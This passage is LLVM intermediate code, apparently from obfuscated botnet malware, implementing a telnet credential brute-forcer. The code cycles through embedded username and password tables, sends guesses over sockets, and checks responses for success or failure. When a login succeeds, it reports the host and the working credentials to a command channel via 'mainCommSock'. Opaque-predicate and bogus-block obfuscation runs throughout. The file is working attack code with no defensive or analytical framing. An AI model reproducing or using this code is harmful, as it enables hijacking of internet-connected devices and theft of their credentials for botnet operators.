  call void @reset_telstate(%struct.telstate_t* %734)
  %735 = load i32, i32* @x.85
  %736 = load i32, i32* @y.86
  %737 = sub i32 %735, 1
  %738 = mul i32 %735, %737
  %739 = urem i32 %738, 2
  %740 = icmp eq i32 %739, 0
  %741 = icmp slt i32 %736, 10
  %742 = or i1 %740, %741
  br i1 %742, label %originalBBpart2127, label %originalBB125alteredBB

originalBBpart2127:                               ; preds = %originalBB125
  br label %1449

; <label>:743:                                    ; preds = %originalBBpart2123
  %744 = load i32, i32* @x.85
  %745 = load i32, i32* @y.86
  %746 = sub i32 %744, 1
  %747 = mul i32 %744, %746
  %748 = urem i32 %747, 2
  %749 = icmp eq i32 %748, 0
  %750 = icmp slt i32 %745, 10
  %751 = or i1 %749, %750
  br i1 %751, label %originalBB129, label %originalBB129alteredBB

originalBB129:                                    ; preds = %originalBB129alteredBB, %743
  %752 = load i32, i32* %5, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %753
  call void @advance_telstate(%struct.telstate_t* %754, i32 4)
  %755 = load i32, i32* @x.85
  %756 = load i32, i32* @y.86
  %757 = sub i32 %755, 1
  %758 = mul i32 %755, %757
  %759 = urem i32 %758, 2
  %760 = icmp eq i32 %759, 0
  %761 = icmp slt i32 %756, 10
  %762 = or i1 %760, %761
  br i1 %762, label %originalBBpart2131, label %originalBB129alteredBB

originalBBpart2131:                               ; preds = %originalBB129
  br label %1432

; <label>:763:                                    ; preds = %139
  %764 = load i32, i32* %5, align 4
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %765
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %766, i32 0, i32 0
  %768 = load i32, i32* %767, align 16
  %769 = load i32, i32* %3, align 4
  %770 = load i32, i32* %5, align 4
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %771
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %772, i32 0, i32 9
  %774 = load i8*, i8** %773, align 8
  %775 = call i32 @read_until_response(i32 %768, i32 %769, i8* %774, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %776 = icmp ne i32 %775, 0
  br i1 %776, label %777, label %794

; <label>:777:                                    ; preds = %763
  %778 = load i32, i32* %5, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %779
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %780, i32 0, i32 9
  %782 = load i8*, i8** %781, align 8
  %783 = call i32 @contains_fail(i8* %782)
  %784 = icmp ne i32 %783, 0
  br i1 %784, label %785, label %789

; <label>:785:                                    ; preds = %777
  %786 = load i32, i32* %5, align 4
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %787
  call void @advance_telstate(%struct.telstate_t* %788, i32 0)
  br label %793

; <label>:789:                                    ; preds = %777
  %790 = load i32, i32* %5, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %791
  call void @advance_telstate(%struct.telstate_t* %792, i32 5)
  br label %793

; <label>:793:                                    ; preds = %789, %785
  br label %1449

; <label>:794:                                    ; preds = %763
  %795 = load i32, i32* %5, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 7
  %799 = load i32, i32* %798, align 16
  %800 = add i32 %799, 3
  %801 = zext i32 %800 to i64
  %802 = call i64 @time(i64* null) #2
  %803 = icmp slt i64 %801, %802
  br i1 %803, label %804, label %824

; <label>:804:                                    ; preds = %794
  %805 = load i32, i32* @x.85
  %806 = load i32, i32* @y.86
  %807 = sub i32 %805, 1
  %808 = mul i32 %805, %807
  %809 = urem i32 %808, 2
  %810 = icmp eq i32 %809, 0
  %811 = icmp slt i32 %806, 10
  %812 = or i1 %810, %811
  br i1 %812, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %804
  %813 = load i32, i32* %5, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %814
  call void @reset_telstate(%struct.telstate_t* %815)
  %816 = load i32, i32* @x.85
  %817 = load i32, i32* @y.86
  %818 = sub i32 %816, 1
  %819 = mul i32 %816, %818
  %820 = urem i32 %819, 2
  %821 = icmp eq i32 %820, 0
  %822 = icmp slt i32 %817, 10
  %823 = or i1 %821, %822
  br i1 %823, label %originalBBpart2135, label %originalBB133alteredBB

originalBBpart2135:                               ; preds = %originalBB133
  br label %824

; <label>:824:                                    ; preds = %originalBBpart2135, %794
  br label %1432

; <label>:825:                                    ; preds = %139
  %826 = load i32, i32* %5, align 4
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %827
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %828, i32 0, i32 0
  %830 = load i32, i32* %829, align 16
  %831 = load i32, i32* %5, align 4
  %832 = sext i32 %831 to i64
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %832
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %833, i32 0, i32 5
  %835 = load i8, i8* %834, align 1
  %836 = zext i8 %835 to i64
  %837 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %836
  %838 = load i8*, i8** %837, align 8
  %839 = load i32, i32* %5, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %840
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %841, i32 0, i32 5
  %843 = load i8, i8* %842, align 1
  %844 = zext i8 %843 to i64
  %845 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %844
  %846 = load i8*, i8** %845, align 8
  %847 = call i64 @strlen(i8* %846) #10
  %848 = call i64 @send(i32 %830, i8* %838, i64 %847, i32 16384)
  %849 = icmp slt i64 %848, 0
  br i1 %849, label %850, label %870

; <label>:850:                                    ; preds = %825
  %851 = load i32, i32* @x.85
  %852 = load i32, i32* @y.86
  %853 = sub i32 %851, 1
  %854 = mul i32 %851, %853
  %855 = urem i32 %854, 2
  %856 = icmp eq i32 %855, 0
  %857 = icmp slt i32 %852, 10
  %858 = or i1 %856, %857
  br i1 %858, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %850
  %859 = load i32, i32* %5, align 4
  %860 = sext i32 %859 to i64
  %861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %860
  call void @reset_telstate(%struct.telstate_t* %861)
  %862 = load i32, i32* @x.85
  %863 = load i32, i32* @y.86
  %864 = sub i32 %862, 1
  %865 = mul i32 %862, %864
  %866 = urem i32 %865, 2
  %867 = icmp eq i32 %866, 0
  %868 = icmp slt i32 %863, 10
  %869 = or i1 %867, %868
  br i1 %869, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br label %1449

; <label>:870:                                    ; preds = %825
  %871 = load i32, i32* @x.85
  %872 = load i32, i32* @y.86
  %873 = sub i32 %871, 1
  %874 = mul i32 %871, %873
  %875 = urem i32 %874, 2
  %876 = icmp eq i32 %875, 0
  %877 = icmp slt i32 %872, 10
  %878 = or i1 %876, %877
  br i1 %878, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %870
  %879 = load i32, i32* %5, align 4
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %880
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %881, i32 0, i32 0
  %883 = load i32, i32* %882, align 16
  %884 = call i64 @send(i32 %883, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i32 0, i32 0), i64 2, i32 16384)
  %885 = icmp slt i64 %884, 0
  %886 = load i32, i32* @x.85
  %887 = load i32, i32* @y.86
  %888 = sub i32 %886, 1
  %889 = mul i32 %886, %888
  %890 = urem i32 %889, 2
  %891 = icmp eq i32 %890, 0
  %892 = icmp slt i32 %887, 10
  %893 = or i1 %891, %892
  br i1 %893, label %originalBBpart2143, label %originalBB141alteredBB

originalBBpart2143:                               ; preds = %originalBB141
  br i1 %885, label %894, label %898

; <label>:894:                                    ; preds = %originalBBpart2143
  %895 = load i32, i32* %5, align 4
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %896
  call void @reset_telstate(%struct.telstate_t* %897)
  br label %1449

; <label>:898:                                    ; preds = %originalBBpart2143
  %899 = load i32, i32* %5, align 4
  %900 = sext i32 %899 to i64
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %900
  call void @advance_telstate(%struct.telstate_t* %901, i32 6)
  br label %1432

; <label>:902:                                    ; preds = %139
  %903 = load i32, i32* %5, align 4
  %904 = sext i32 %903 to i64
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %904
  %906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %905, i32 0, i32 0
  %907 = load i32, i32* %906, align 16
  %908 = load i32, i32* %3, align 4
  %909 = load i32, i32* %5, align 4
  %910 = sext i32 %909 to i64
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %910
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %911, i32 0, i32 9
  %913 = load i8*, i8** %912, align 8
  %914 = call i32 @read_until_response(i32 %907, i32 %908, i8* %913, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %915 = icmp ne i32 %914, 0
  br i1 %915, label %916, label %1035

; <label>:916:                                    ; preds = %902
  %917 = load i32, i32* @x.85
  %918 = load i32, i32* @y.86
  %919 = sub i32 %917, 1
  %920 = mul i32 %917, %919
  %921 = urem i32 %920, 2
  %922 = icmp eq i32 %921, 0
  %923 = icmp slt i32 %918, 10
  %924 = or i1 %922, %923
  br i1 %924, label %originalBB145, label %originalBB145alteredBB

originalBB145:                                    ; preds = %originalBB145alteredBB, %916
  %925 = call i64 @time(i64* null) #2
  %926 = trunc i64 %925 to i32
  %927 = load i32, i32* %5, align 4
  %928 = sext i32 %927 to i64
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %928
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %929, i32 0, i32 7
  store i32 %926, i32* %930, align 16
  %931 = load i32, i32* %5, align 4
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %932
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %933, i32 0, i32 9
  %935 = load i8*, i8** %934, align 8
  %936 = call i32 @contains_fail(i8* %935)
  %937 = icmp ne i32 %936, 0
  %938 = load i32, i32* @x.85
  %939 = load i32, i32* @y.86
  %940 = sub i32 %938, 1
  %941 = mul i32 %938, %940
  %942 = urem i32 %941, 2
  %943 = icmp eq i32 %942, 0
  %944 = icmp slt i32 %939, 10
  %945 = or i1 %943, %944
  br i1 %945, label %originalBBpart2147, label %originalBB145alteredBB

originalBBpart2147:                               ; preds = %originalBB145
  br i1 %937, label %946, label %950

; <label>:946:                                    ; preds = %originalBBpart2147
  %947 = load i32, i32* %5, align 4
  %948 = sext i32 %947 to i64
  %949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %948
  call void @advance_telstate(%struct.telstate_t* %949, i32 0)
  br label %1034

; <label>:950:                                    ; preds = %originalBBpart2147
  %951 = load i32, i32* @x.85
  %952 = load i32, i32* @y.86
  %953 = sub i32 %951, 1
  %954 = mul i32 %951, %953
  %955 = urem i32 %954, 2
  %956 = icmp eq i32 %955, 0
  %957 = icmp slt i32 %952, 10
  %958 = or i1 %956, %957
  br i1 %958, label %originalBB149, label %originalBB149alteredBB

originalBB149:                                    ; preds = %originalBB149alteredBB, %950
  %959 = load i32, i32* %5, align 4
  %960 = sext i32 %959 to i64
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %960
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %961, i32 0, i32 9
  %963 = load i8*, i8** %962, align 8
  %964 = call i32 @contains_success(i8* %963)
  %965 = icmp ne i32 %964, 0
  %966 = load i32, i32* @x.85
  %967 = load i32, i32* @y.86
  %968 = sub i32 %966, 1
  %969 = mul i32 %966, %968
  %970 = urem i32 %969, 2
  %971 = icmp eq i32 %970, 0
  %972 = icmp slt i32 %967, 10
  %973 = or i1 %971, %972
  br i1 %973, label %originalBBpart2151, label %originalBB149alteredBB

originalBBpart2151:                               ; preds = %originalBB149
  br i1 %965, label %974, label %1029

; <label>:974:                                    ; preds = %originalBBpart2151
  %975 = load i32, i32* %5, align 4
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %976
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %977, i32 0, i32 3
  %979 = load i8, i8* %978, align 1
  %980 = zext i8 %979 to i32
  %981 = icmp eq i32 %980, 2
  br i1 %981, label %982, label %1002

; <label>:982:                                    ; preds = %974
  %983 = load i32, i32* @x.85
  %984 = load i32, i32* @y.86
  %985 = sub i32 %983, 1
  %986 = mul i32 %983, %985
  %987 = urem i32 %986, 2
  %988 = icmp eq i32 %987, 0
  %989 = icmp slt i32 %984, 10
  %990 = or i1 %988, %989
  br i1 %990, label %originalBB153, label %originalBB153alteredBB

originalBB153:                                    ; preds = %originalBB153alteredBB, %982
  %991 = load i32, i32* %5, align 4
  %992 = sext i32 %991 to i64
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %992
  call void @advance_telstate(%struct.telstate_t* %993, i32 7)
  %994 = load i32, i32* @x.85
  %995 = load i32, i32* @y.86
  %996 = sub i32 %994, 1
  %997 = mul i32 %994, %996
  %998 = urem i32 %997, 2
  %999 = icmp eq i32 %998, 0
  %1000 = icmp slt i32 %995, 10
  %1001 = or i1 %999, %1000
  br i1 %1001, label %originalBBpart2155, label %originalBB153alteredBB

originalBBpart2155:                               ; preds = %originalBB153
  br label %1028

; <label>:1002:                                   ; preds = %974
  %1003 = load i32, i32* @mainCommSock, align 4
  %1004 = load i32, i32* %5, align 4
  %1005 = sext i32 %1004 to i64
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1005
  %1007 = call i8* @get_telstate_host(%struct.telstate_t* %1006)
  %1008 = load i32, i32* %5, align 4
  %1009 = sext i32 %1008 to i64
  %1010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1009
  %1011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1010, i32 0, i32 4
  %1012 = load i8, i8* %1011, align 2
  %1013 = zext i8 %1012 to i64
  %1014 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %1013
  %1015 = load i8*, i8** %1014, align 8
  %1016 = load i32, i32* %5, align 4
  %1017 = sext i32 %1016 to i64
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1017
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1018, i32 0, i32 5
  %1020 = load i8, i8* %1019, align 1
  %1021 = zext i8 %1020 to i64
  %1022 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %1021
  %1023 = load i8*, i8** %1022, align 8
  %1024 = call i32 (i32, i8*, ...) @sockprintf(i32 %1003, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.315, i32 0, i32 0), i8* %1007, i8* %1015, i8* %1023)
  %1025 = load i32, i32* %5, align 4
  %1026 = sext i32 %1025 to i64
  %1027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1026
  call void @advance_telstate(%struct.telstate_t* %1027, i32 7)
  br label %1028

; <label>:1028:                                   ; preds = %1002, %originalBBpart2155
  br label %1033

; <label>:1029:                                   ; preds = %originalBBpart2151
  %1030 = load i32, i32* %5, align 4
  %1031 = sext i32 %1030 to i64
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1031
  call void @reset_telstate(%struct.telstate_t* %1032)
  br label %1033

; <label>:1033:                                   ; preds = %1029, %1028
  br label %1034

; <label>:1034:                                   ; preds = %1033, %946
  br label %1449

; <label>:1035:                                   ; preds = %902
  %1036 = load i32, i32* @x.85
  %1037 = load i32, i32* @y.86
  %1038 = sub i32 %1036, 1
  %1039 = mul i32 %1036, %1038
  %1040 = urem i32 %1039, 2
  %1041 = icmp eq i32 %1040, 0
  %1042 = icmp slt i32 %1037, 10
  %1043 = or i1 %1041, %1042
  br i1 %1043, label %originalBB157, label %originalBB157alteredBB

originalBB157:                                    ; preds = %originalBB157alteredBB, %1035
  %1044 = load i32, i32* %5, align 4
  %1045 = sext i32 %1044 to i64
  %1046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1045
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1046, i32 0, i32 7
  %1048 = load i32, i32* %1047, align 16
  %1049 = add i32 %1048, 7
  %1050 = zext i32 %1049 to i64
  %1051 = call i64 @time(i64* null) #2
  %1052 = icmp slt i64 %1050, %1051
  %1053 = load i32, i32* @x.85
  %1054 = load i32, i32* @y.86
  %1055 = sub i32 %1053, 1
  %1056 = mul i32 %1053, %1055
  %1057 = urem i32 %1056, 2
  %1058 = icmp eq i32 %1057, 0
  %1059 = icmp slt i32 %1054, 10
  %1060 = or i1 %1058, %1059
  br i1 %1060, label %originalBBpart2169, label %originalBB157alteredBB

originalBBpart2169:                               ; preds = %originalBB157
  br i1 %1052, label %1061, label %1065

; <label>:1061:                                   ; preds = %originalBBpart2169
  %1062 = load i32, i32* %5, align 4
  %1063 = sext i32 %1062 to i64
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1063
  call void @reset_telstate(%struct.telstate_t* %1064)
  br label %1065

; <label>:1065:                                   ; preds = %1061, %originalBBpart2169
  %1066 = load i32, i32* @x.85
  %1067 = load i32, i32* @y.86
  %1068 = sub i32 %1066, 1
  %1069 = mul i32 %1066, %1068
  %1070 = urem i32 %1069, 2
  %1071 = icmp eq i32 %1070, 0
  %1072 = icmp slt i32 %1067, 10
  %1073 = or i1 %1071, %1072
  br i1 %1073, label %originalBB171, label %originalBB171alteredBB

originalBB171:                                    ; preds = %originalBB171alteredBB, %1065
  %1074 = load i32, i32* @x.85
  %1075 = load i32, i32* @y.86
  %1076 = sub i32 %1074, 1
  %1077 = mul i32 %1074, %1076
  %1078 = urem i32 %1077, 2
  %1079 = icmp eq i32 %1078, 0
  %1080 = icmp slt i32 %1075, 10
  %1081 = or i1 %1079, %1080
  br i1 %1081, label %originalBBpart2173, label %originalBB171alteredBB

originalBBpart2173:                               ; preds = %originalBB171
  br label %1432

; <label>:1082:                                   ; preds = %139
  %1083 = call i64 @time(i64* null) #2
  %1084 = trunc i64 %1083 to i32
  %1085 = load i32, i32* %5, align 4
  %1086 = sext i32 %1085 to i64
  %1087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1086
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1087, i32 0, i32 7
  store i32 %1084, i32* %1088, align 16
  %1089 = load i32, i32* %5, align 4
  %1090 = sext i32 %1089 to i64
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1090
  %1092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1091, i32 0, i32 0
  %1093 = load i32, i32* %1092, align 16
  %1094 = call i64 @send(i32 %1093, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.316, i32 0, i32 0), i64 8, i32 16384)
  %1095 = icmp slt i64 %1094, 0
  br i1 %1095, label %1096, label %1111

; <label>:1096:                                   ; preds = %1082
  %1097 = load i32, i32* %5, align 4
  %1098 = sext i32 %1097 to i64
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1098
  %1100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1099, i32 0, i32 0
  %1101 = load i32, i32* %1100, align 16
  %1102 = call i32 @sclose(i32 %1101)
  %1103 = load i32, i32* %5, align 4
  %1104 = sext i32 %1103 to i64
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1104
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1105, i32 0, i32 2
  store i8 0, i8* %1106, align 8
  %1107 = load i32, i32* %5, align 4
  %1108 = sext i32 %1107 to i64
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1108
  %1110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1109, i32 0, i32 3
  store i8 1, i8* %1110, align 1
  br label %1449

; <label>:1111:                                   ; preds = %1082
  %1112 = load i32, i32* @x.85
  %1113 = load i32, i32* @y.86
  %1114 = sub i32 %1112, 1
  %1115 = mul i32 %1112, %1114
  %1116 = urem i32 %1115, 2
  %1117 = icmp eq i32 %1116, 0
  %1118 = icmp slt i32 %1113, 10
  %1119 = or i1 %1117, %1118
  br i1 %1119, label %originalBB175, label %originalBB175alteredBB

originalBB175:                                    ; preds = %originalBB175alteredBB, %1111
  %1120 = load i32, i32* %5, align 4
  %1121 = sext i32 %1120 to i64
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1121
  %1123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1122, i32 0, i32 0
  %1124 = load i32, i32* %1123, align 16
  %1125 = call i64 @send(i32 %1124, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.317, i32 0, i32 0), i64 8, i32 16384)
  %1126 = icmp slt i64 %1125, 0
  %1127 = load i32, i32* @x.85
  %1128 = load i32, i32* @y.86
  %1129 = sub i32 %1127, 1
  %1130 = mul i32 %1127, %1129
  %1131 = urem i32 %1130, 2
  %1132 = icmp eq i32 %1131, 0
  %1133 = icmp slt i32 %1128, 10
  %1134 = or i1 %1132, %1133
  br i1 %1134, label %originalBBpart2177, label %originalBB175alteredBB

originalBBpart2177:                               ; preds = %originalBB175
  br i1 %1126, label %1135, label %1166

; <label>:1135:                                   ; preds = %originalBBpart2177
  %1136 = load i32, i32* @x.85
  %1137 = load i32, i32* @y.86
  %1138 = sub i32 %1136, 1
  %1139 = mul i32 %1136, %1138
  %1140 = urem i32 %1139, 2
  %1141 = icmp eq i32 %1140, 0
  %1142 = icmp slt i32 %1137, 10
  %1143 = or i1 %1141, %1142
  br i1 %1143, label %originalBB179, label %originalBB179alteredBB

originalBB179:                                    ; preds = %originalBB179alteredBB, %1135
  %1144 = load i32, i32* %5, align 4
  %1145 = sext i32 %1144 to i64
  %1146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1145
  %1147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1146, i32 0, i32 0
  %1148 = load i32, i32* %1147, align 16
  %1149 = call i32 @sclose(i32 %1148)
  %1150 = load i32, i32* %5, align 4
  %1151 = sext i32 %1150 to i64
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1151
  %1153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1152, i32 0, i32 2
  store i8 0, i8* %1153, align 8
  %1154 = load i32, i32* %5, align 4
  %1155 = sext i32 %1154 to i64
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1155
  %1157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1156, i32 0, i32 3
  store i8 1, i8* %1157, align 1
  %1158 = load i32, i32* @x.85
  %1159 = load i32, i32* @y.86
  %1160 = sub i32 %1158, 1
  %1161 = mul i32 %1158, %1160
  %1162 = urem i32 %1161, 2
  %1163 = icmp eq i32 %1162, 0
  %1164 = icmp slt i32 %1159, 10
  %1165 = or i1 %1163, %1164
  br i1 %1165, label %originalBBpart2181, label %originalBB179alteredBB

originalBBpart2181:                               ; preds = %originalBB179
  br label %1449

; <label>:1166:                                   ; preds = %originalBBpart2177
  %1167 = load i32, i32* @x.85
  %1168 = load i32, i32* @y.86
  %1169 = sub i32 %1167, 1
  %1170 = mul i32 %1167, %1169
  %1171 = urem i32 %1170, 2
  %1172 = icmp eq i32 %1171, 0
  %1173 = icmp slt i32 %1168, 10
  %1174 = or i1 %1172, %1173
  br i1 %1174, label %originalBB183, label %originalBB183alteredBB

originalBB183:                                    ; preds = %originalBB183alteredBB, %1166
  %1175 = load i32, i32* %5, align 4
  %1176 = sext i32 %1175 to i64
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1176
  %1178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1177, i32 0, i32 0
  %1179 = load i32, i32* %1178, align 16
  %1180 = call i64 @send(i32 %1179, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.318, i32 0, i32 0), i64 7, i32 16384)
  %1181 = icmp slt i64 %1180, 0
  %1182 = load i32, i32* @x.85
  %1183 = load i32, i32* @y.86
  %1184 = sub i32 %1182, 1
  %1185 = mul i32 %1182, %1184
  %1186 = urem i32 %1185, 2
  %1187 = icmp eq i32 %1186, 0
  %1188 = icmp slt i32 %1183, 10
  %1189 = or i1 %1187, %1188
  br i1 %1189, label %originalBBpart2185, label %originalBB183alteredBB

originalBBpart2185:                               ; preds = %originalBB183
  br i1 %1181, label %1190, label %1205

; <label>:1190:                                   ; preds = %originalBBpart2185
  %1191 = load i32, i32* %5, align 4
  %1192 = sext i32 %1191 to i64
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1192
  %1194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1193, i32 0, i32 0
  %1195 = load i32, i32* %1194, align 16
  %1196 = call i32 @sclose(i32 %1195)
  %1197 = load i32, i32* %5, align 4
  %1198 = sext i32 %1197 to i64
  %1199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1198
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1199, i32 0, i32 2
  store i8 0, i8* %1200, align 8
  %1201 = load i32, i32* %5, align 4
  %1202 = sext i32 %1201 to i64
  %1203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1202
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1203, i32 0, i32 3
  store i8 1, i8* %1204, align 1
  br label %1449

; <label>:1205:                                   ; preds = %originalBBpart2185
  %1206 = load i32, i32* %5, align 4
  %1207 = sext i32 %1206 to i64
  %1208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1207
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1208, i32 0, i32 0
  %1210 = load i32, i32* %1209, align 16
  %1211 = call i64 @send(i32 %1210, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.319, i32 0, i32 0), i64 4, i32 16384)
  %1212 = icmp slt i64 %1211, 0
  br i1 %1212, label %1213, label %1228

; <label>:1213:                                   ; preds = %1205
  %1214 = load i32, i32* %5, align 4
  %1215 = sext i32 %1214 to i64
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1215
  %1217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1216, i32 0, i32 0
  %1218 = load i32, i32* %1217, align 16
  %1219 = call i32 @sclose(i32 %1218)
  %1220 = load i32, i32* %5, align 4
  %1221 = sext i32 %1220 to i64
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1221
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1222, i32 0, i32 2
  store i8 0, i8* %1223, align 8
  %1224 = load i32, i32* %5, align 4
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1225
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1226, i32 0, i32 3
  store i8 1, i8* %1227, align 1
  br label %1449

; <label>:1228:                                   ; preds = %1205
  %1229 = load i32, i32* %5, align 4
  %1230 = sext i32 %1229 to i64
  %1231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %1230
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1231, i32 0, i32 0
  %1233 = load i32, i32* %1232, align 16
  %1234 = call i64 @send(i32 %1233, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.320, i32 0, i32 0), i64 26, i32 16384)
  %1235 = icmp slt i64 %1234, 0
  br i1 %1235, label %1236, label %1267

; <label>:1236:                                   ; preds = %1228
  %1237 = load i32, i32* @x.85
  %1238 = load i32, i32* @y.86
  %1239 = sub i32 %1237, 1
  %1240 = mul i32 %1237, %1239
  %1241 = urem i32 %1240, 2
  %1242 = icmp eq i32 %1241, 0
  %1243 = icmp slt i32 %1238, 10
  %1244 = or i1 %1242, %1243
  br i1 %1244, label %originalBB187, label %originalBB187alteredBB

originalBB187:                                    ; preds = %originalBB187alteredBB, %1236
  %1245 = load i32, i32* %5, align 4
